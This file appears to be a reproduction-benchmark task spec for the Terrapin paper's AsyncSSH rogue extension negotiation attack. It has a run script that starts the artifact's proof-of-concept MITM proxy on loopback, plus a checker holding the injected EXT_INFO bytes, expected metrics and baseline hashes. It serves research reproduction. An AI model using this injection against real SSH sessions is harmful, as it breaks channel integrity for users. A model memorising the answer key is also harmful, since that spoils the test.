@@ -1,0 +1,265 @@
+# Verified subset: artifact appendix A.4.1 C3 / A.4.2 E3; the AsyncSSH 2.13.2
+# rogue extension negotiation attack only. C1/C2/C4, the internet-scan
+# aggregation and all non-AsyncSSH targets are excluded.
+id: usenixsec2024-terrapin-rogue-extension
+title: 'Terrapin Attack: Breaking SSH Channel Integrity by Sequence Number Manipulation'
+venue:
+  name: USENIX Security
+  year: 2024
+paper:
+  url: https://www.usenix.org/conference/usenixsecurity24/presentation/baumer
+artifact:
+  url: https://github.com/RUB-NDS/Terrapin-Artifacts
+  clone: |
+    git clone https://github.com/RUB-NDS/Terrapin-Artifacts.git artifact, then
+    `git -C artifact checkout 9907c80fa7e4184a29ceac352947ea51a49dce6a` and run
+    run.command from inside artifact/. The pinned appendix commit is
+    https://github.com/RUB-NDS/Terrapin-Artifacts/tree/9907c80fa7e4184a29ceac352947ea51a49dce6a.
+  ref_type: commit
+  ref: 9907c80fa7e4184a29ceac352947ea51a49dce6a
+  license: Apache-2.0
+badges:
+- available
+- functional
+- reproduced
+resources:
+  cpu_only: true
+  ram_gb: 1
+  disk_gb: 1
+  runtime_minutes: 5
+  docker: false
+  network_required: true
+  notes: |
+    Only artifact appendix A.4.1 C3 / A.4.2 E3 (AsyncSSH 2.13.2 rogue extension
+    negotiation) is included. Appendix "A.2.4 Hardware dependencies: None.";
+    A.4.2 "(E3): test-asyncssh-rogue-ext-negotiation.sh [~ 1 minute]".
+    https://secartifacts.github.io/usenixsec2024/appendix-files/sec24fallae-final31.pdf
+    The AEC row awards available, functional and reproduced:
+    https://secartifacts.github.io/usenixsec2024/results.
+
+    Native (non-Docker) adaptation. The artifact ships this experiment as
+    scripts/test-asyncssh-rogue-ext-negotiation.sh, which builds Docker images
+    and opens the result logs in `less`. run.command instead runs the artifact's
+    own AsyncSSH 2.13.2 server (impl/asyncssh/files/simple_server.py), its
+    unmodified rogue-extension proxy (pocs/asyncssh/rogue_extension_negotiation.py)
+    and its client (impl/asyncssh/files/simple_client.py) as native processes,
+    then applies a strict checker. Exactly two one-line adaptations of the
+    artifact's helpers are made in copies under amber-terrapin/: the server binds
+    127.0.0.1 instead of all interfaces, and the client reads known_hosts from the
+    artifact's bundled impl/asyncssh/files/known_hosts instead of
+    /root/.ssh/known_hosts. No protocol, cryptography, packet, algorithm-list or
+    buffering edits; the proxy and the 676-byte rogue server-sig-algs EXT_INFO
+    splice are byte-for-byte the artifact's. One direct connection and one
+    tampered connection; no repetitions, averaging or statistical/timing claim.
+
+    Prerequisites: Linux x86_64, POSIX shell, git, Python 3.9+ with the venv
+    module and network access to PyPI; Python 3.12.3 was tested. AsyncSSH 2.13.2
+    and its dependencies are installed into a local venv under amber-terrapin/
+    with pip --require-hashes from the pinned wheel set below. asyncssh 2.13.2's
+    wheel hash equals the wheel the artifact bundles at
+    impl/asyncssh/source/asyncssh-2.13.2-py3-none-any.whl
+    (sha256 c7dfe9085c0659acb2ef0d177fb12421e92a20d52b98ab83eed4a5916a1d60cc).
+    No Docker, compiler or GPU is needed. network_required describes public
+    artifact (git) and wheel (PyPI) acquisition; the experiment itself is local
+    loopback only, ports 2200/2201 (keep them free).
+
+    First run on 2026-11-11: the native driver completed in 12.42 s wall;
+    maximum sampled process-group RSS 110690304 B, zero sampled swap, no limit
+    event; GNU time largest single-process maximum RSS 39732 KiB. The three count
+    metrics were rogue_extension_accepted=1, completed_client_sessions=2,
+    modified_server_flights=1. All 59 original artifact files were byte-identical
+    to the pinned manifest after the run. An independent validator re-derived the
+    server-sig-algs values from the raw logs and reconstructed the proxy's byte
+    modification from scratch, agreeing with the checker. The numeric fields are
+    conservative local budgets; limits and sampling belong to the external runner.
+
+    The literal run.command passed from a second fresh checkout on 2026-11-11 in
+    18.77 s wall (venv creation and PyPI install included), 114102272 B sampled
+    aggregate peak RSS, zero swap, no limit event; the same three metrics,
+    versions.log "asyncssh 2.13.2", independent validation and the unchanged
+    59-file manifest were confirmed again. The checker rejected 12 incomplete or
+    tampered fixtures (missing files, removed/forged server-sig-algs, broken
+    cipher, injected traceback, duplicated/truncated proxy flight, wrong statuses)
+    and accepted only the genuine outputs. Baseline hashes below are from that
+    fresh literal-command capture; statuses.json, metrics.json, versions.log and
+    the client stdout banners are stable across runs, while the debug stderr logs
+    and the proxy byte dumps carry ephemeral key material and are not bit
+    reproducible.
+role: positive
+expected_verdict: REPRODUCED
+claims:
+- metric: rogue_extension_accepted
+  threshold: == 1
+  unit: accepted rogue extension (boolean)
+  source: Paper Section 6.1 and Table 1 (C3 row), https://www.usenix.org/system/files/usenixsecurity24-baumer.pdf;
+    artifact appendix A.4.1 C3 and A.4.2 E3, https://secartifacts.github.io/usenixsec2024/appendix-files/sec24fallae-final31.pdf
+  measurement_protocol: 'Run the AsyncSSH 2.13.2 simple_client.py twice against an AsyncSSH 2.13.2 simple_server.py:
+    once directly, once through the artifact''s unmodified rogue_extension_negotiation.py proxy. The proxy splices a
+    676-byte server-sig-algs EXT_INFO carrying the single algorithm chosen@attacker.com before SSH_MSG_NEWKEYS.
+    The value is 1 only when the tampered client logs server-sig-algs == [chosen@attacker.com] while the direct
+    client, the direct server and the tampered server all log the genuine list without that value. Preserve the
+    original proxy, PoC bytes, crypto and algorithm lists; make only the two documented one-line host/known_hosts
+    adaptations. This is appendix C3/E3, not C1/C2/C4, not the internet scan, and not a timing test. Setup failures,
+    resource limits and timeouts are blockers, never scientific failures.'
+  expected_verdict: REPRODUCED
+  notes: 'Proves the Rogue Extension Negotiation attack (paper Sect. 6.1): because AsyncSSH omits the transcript
+    hash over the handshake, the attacker deletes the real EXT_INFO and inserts a chosen one that the client accepts.'
+  measure:
+    file: amber-terrapin/metrics.json
+    regex: '"rogue_extension_accepted": ([0-9]+)'
+- metric: completed_client_sessions
+  threshold: == 2
+  unit: authenticated client sessions
+  source: Paper Section 6.1 and Table 1 (C3 row), https://www.usenix.org/system/files/usenixsecurity24-baumer.pdf;
+    artifact appendix A.4.1 C3 and A.4.2 E3, https://secartifacts.github.io/usenixsec2024/appendix-files/sec24fallae-final31.pdf
+  measurement_protocol: 'Both the direct and the tampered connection must complete: each client authenticates the
+    user victim exactly once, negotiates chacha20-poly1305@openssh.com in both directions and receives the server
+    banner "Welcome to my SSH server, victim!", exiting 0. This establishes that the rogue extension is accepted on
+    an otherwise functional connection, not one that was merely broken. Confirms E3''s "attack is automatic" success.'
+  expected_verdict: REPRODUCED
+  notes: 'The attacked session stays live and authenticated; the integrity break is silent, which is the point of C3.'
+  measure:
+    file: amber-terrapin/metrics.json
+    regex: '"completed_client_sessions": ([0-9]+)'
+- metric: modified_server_flights
+  threshold: == 1
+  unit: tampered server flights
+  source: Paper Section 6.1, https://www.usenix.org/system/files/usenixsecurity24-baumer.pdf; artifact
+    pocs/asyncssh/rogue_extension_negotiation.py at ref 9907c80fa7e4184a29ceac352947ea51a49dce6a
+  measurement_protocol: 'The proxy logs exactly one "Original server_data before modification" / "Modified
+    server_data with rogue extension info" pair. An independent decoder locates the SSH_MSG_NEWKEYS marker
+    (0000000c0a15) in the original flight and reconstructs the modified flight as original[:i] + rogue_ext_info +
+    original[i:i+16] + original[i+16+676:]; the reconstruction must equal the proxy''s modified bytes, the rogue
+    EXT_INFO must be present in the modified flight and absent from the original. Exactly one modification witness.'
+  expected_verdict: REPRODUCED
+  notes: 'Pins the attack to the exact byte-level transformation in the paper''s Figure for Sect. 6.1, not just a log string.'
+  measure:
+    file: amber-terrapin/metrics.json
+    regex: '"modified_server_flights": ([0-9]+)'
+run:
+  command: |
+    set -eu
+    test "$(git rev-parse HEAD)" = 9907c80fa7e4184a29ceac352947ea51a49dce6a
+    mkdir amber-terrapin
+    python3 -m venv amber-terrapin/venv
+    cat > amber-terrapin/requirements.txt <<'REQ'
+    asyncssh==2.13.2 --hash=sha256:c7dfe9085c0659acb2ef0d177fb12421e92a20d52b98ab83eed4a5916a1d60cc
+    cryptography==42.0.5 --hash=sha256:cd2030f6650c089aeb304cf093f3244d34745ce0cfcc39f20c6fbfe030102e2a
+    cffi==1.16.0 --hash=sha256:e715596e683d2ce000574bae5d07bd522c781a822866c20495e52520564f0969
+    pycparser==2.21 --hash=sha256:8ee45429555515e1f6b185e78100aea234072576aa43ab53aefcae078162fca9
+    typing_extensions==4.10.0 --hash=sha256:69b1a937c3a517342112fb4c6df7e72fc39a38e7891a5730ed4985b5214b5475
+    click==8.1.7 --hash=sha256:ae74fb96c20a0277a1d615f1e4d73c8414f5a98db8b799a7931d1582f3390c28
+    asyncio==3.4.3 --hash=sha256:c4d18b22701821de07bd6aea8b53d21449ec0ec5680645e5317062ea21817d2d
+    tqdm==4.66.2 --hash=sha256:1ee4f8a893eb9bef51c6e35730cebf234d5d0b6bd112b0271e10ed7c24a02bd9
+    REQ
+    amber-terrapin/venv/bin/pip install --quiet --no-input --require-hashes -r amber-terrapin/requirements.txt
+    amber-terrapin/venv/bin/python -c "import asyncssh; assert asyncssh.__version__ == '2.13.2'; print('asyncssh', asyncssh.__version__)" > amber-terrapin/versions.log
+    amber-terrapin/venv/bin/python - <<'DRIVER'
+    import json, pathlib, subprocess, sys, time
+    out = pathlib.Path('amber-terrapin'); py = sys.executable
+    base = pathlib.Path('impl/asyncssh/files')
+    srv = (base/'simple_server.py').read_text(); cli = (base/'simple_client.py').read_text()
+    assert srv.count('MySSHServer,\n        "",') == 1 and cli.count('"/root/.ssh/known_hosts"') == 1
+    (out/'server.py').write_text(srv.replace('MySSHServer,\n        "",', 'MySSHServer,\n        "127.0.0.1",'))
+    (out/'client.py').write_text(cli.replace('"/root/.ssh/known_hosts"', repr(str(base/'known_hosts'))))
+    statuses = {}
+    for case, port in [('direct', 2200), ('tampered', 2201)]:
+        procs = []; handles = []
+        def start(label, args):
+            fo = [open(out/('%s.%s.log' % (label, s)), 'w') for s in ('stdout', 'stderr')]
+            handles.extend(fo); p = subprocess.Popen([py]+args, stdout=fo[0], stderr=fo[1])
+            procs.append((label, p)); return p
+        try:
+            start(case+'-server', [str(out/'server.py'), '--username', 'victim', '--password', 'secret', '--host-key', str(base/'ssh_host_rsa_key'), '-p', '2200'])
+            if case == 'tampered':
+                start('proxy', ['pocs/asyncssh/rogue_extension_negotiation.py', '--proxy-ip', '127.0.0.1', '--proxy-port', '2201', '--server-ip', '127.0.0.1', '--server-port', '2200'])
+            time.sleep(5)
+            assert all(p.poll() is None for _, p in procs), 'server/proxy failed to start'
+            c = start(case+'-client', [str(out/'client.py'), '--username', 'victim', '--password', 'secret', '-p', str(port)])
+            statuses[case+'-client'] = c.wait(); assert c.returncode == 0, 'client did not finish'
+            time.sleep(.2)
+        finally:
+            for name, p in reversed(procs):
+                if p.poll() is None: p.terminate()
+                statuses[name] = p.wait()
+            for f in handles: f.close()
+    (out/'statuses.json').write_text(json.dumps(statuses, sort_keys=True)+'\n')
+    DRIVER
+    python3 -I - <<'CHECK' > amber-terrapin/metrics.json
+    import json, pathlib, re
+    out = pathlib.Path('amber-terrapin')
+    L = {p.name: p.read_text() for p in out.glob('*.log')}
+    rogue = bytes.fromhex('000000380807000000010000000F7365727665722D7369672D616C67730000001363686F73656E4061747461636B65722E636F6D0000000000000000')
+    v = lambda n: re.findall(r'server-sig-algs: ([^\r\n]+)', L[n])
+    dc, ds, tc, ts = v('direct-client.stderr.log'), v('direct-server.stderr.log'), v('tampered-client.stderr.log'), v('tampered-server.stderr.log')
+    assert len(dc) == len(ds) == len(ts) == 1, 'genuine server-sig-algs must appear once'
+    assert dc == ds == ts and 'chosen@attacker.com' not in dc[0], 'honest parties must see the genuine list'
+    assert tc == ['chosen@attacker.com'], 'tampered client must accept only the attacker value'
+    for case in ('direct', 'tampered'):
+        assert L['%s-client.stdout.log' % case].splitlines()[-1] == 'Welcome to my SSH server, victim!', 'missing banner'
+        for peer in ('client', 'server'):
+            t = L['%s-%s.stderr.log' % (case, peer)]
+            assert t.count('Auth for user victim succeeded') == 1, 'victim must authenticate once'
+            assert t.count('Encryption alg: chacha20-poly1305@openssh.com') == 2, 'chacha20-poly1305 both directions'
+            assert not re.search(r'Traceback|SSH connection failed|Error starting server', t), 'error in log'
+    px = L['proxy.stdout.log']
+    o = re.findall(r'Original server_data before modification: ([0-9a-f]+)', px)
+    m = re.findall(r'Modified server_data with rogue extension info: ([0-9a-f]+)', px)
+    assert len(o) == len(m) == 1, 'exactly one modified server flight'
+    raw, new = bytes.fromhex(o[0]), bytes.fromhex(m[0]); mk = bytes.fromhex('0000000c0a15'); i = raw.index(mk)
+    assert raw.count(mk) == 1 and new == raw[:i] + rogue + raw[i:i+16] + raw[i+16+676:], 'byte reconstruction must match'
+    assert rogue in new and rogue not in raw, 'rogue EXT_INFO must be injected'
+    st = json.loads((out/'statuses.json').read_text())
+    assert st == {'direct-client': 0, 'direct-server': -15, 'proxy': -15, 'tampered-client': 0, 'tampered-server': -15}, 'unexpected process statuses'
+    print(json.dumps({'rogue_extension_accepted': 1, 'completed_client_sessions': 2, 'modified_server_flights': 1}, sort_keys=True))
+    CHECK
+  outputs:
+  - amber-terrapin/versions.log
+  - amber-terrapin/direct-server.stdout.log
+  - amber-terrapin/direct-server.stderr.log
+  - amber-terrapin/direct-client.stdout.log
+  - amber-terrapin/direct-client.stderr.log
+  - amber-terrapin/tampered-server.stdout.log
+  - amber-terrapin/tampered-server.stderr.log
+  - amber-terrapin/tampered-client.stdout.log
+  - amber-terrapin/tampered-client.stderr.log
+  - amber-terrapin/proxy.stdout.log
+  - amber-terrapin/proxy.stderr.log
+  - amber-terrapin/statuses.json
+  - amber-terrapin/metrics.json
+baseline:
+  captured_on: '2026-11-11'
+  machine: AMD Ryzen 5 6600H (6 cores / 12 threads), 15166 MiB RAM; Ubuntu 24.04.4 LTS x86_64,
+    Linux 7.0.0-42-generic; Python 3.12.3; asyncssh 2.13.2 in a local venv
+  outputs:
+  - path: amber-terrapin/versions.log
+    sha256: cd48d8294e6b6e3a7e53116955f23573420f99a7a6c6f417e2082598aa47df2f
+  - path: amber-terrapin/direct-server.stdout.log
+    sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+  - path: amber-terrapin/direct-server.stderr.log
+    sha256: 649553025810032f68f8644e777092b0d129b3d61584ef2d62782db6dcb5891e
+  - path: amber-terrapin/direct-client.stdout.log
+    sha256: 8a85e73e9077666c36c98cbe6a44a3188afeb33d4d9dadb68aa112d5a5d98886
+  - path: amber-terrapin/direct-client.stderr.log
+    sha256: 646114f3263a5b63d247f4e6eb0b330d99958a28c9d04e879c5dd5aa3ceee982
+  - path: amber-terrapin/tampered-server.stdout.log
+    sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+  - path: amber-terrapin/tampered-server.stderr.log
+    sha256: c880b2affd453cb8421affb1bc1aeaa4dd9eec8faed9b4cb93c9117b9ca926ff
+  - path: amber-terrapin/tampered-client.stdout.log
+    sha256: 03d1292464fdb68e7375b13428b5fb2d252e48f1005faca4942da4e1b79ab0c7
+  - path: amber-terrapin/tampered-client.stderr.log
+    sha256: 95709b36016a336c4097ec737ea2464897469f43a86c7a1f617a5e800411c88a
+  - path: amber-terrapin/proxy.stdout.log
+    sha256: eb609af257f68d75695db0ded955312c4e047a8583409adebb6b965677698e6a
+  - path: amber-terrapin/proxy.stderr.log
+    sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+  - path: amber-terrapin/statuses.json
+    sha256: c7e70020fda5427dc4053b55f6c7fb2c11daec140275a661a81c71c2627eba00
+  - path: amber-terrapin/metrics.json
+    sha256: c97ba840cd957f764e9b51566f0baa6e75d66df54474073b6af8ed40b15bda97
+  metrics:
+    rogue_extension_accepted: 1
+    completed_client_sessions: 2
+    modified_server_flights: 1
+  bit_for_bit_expected: false
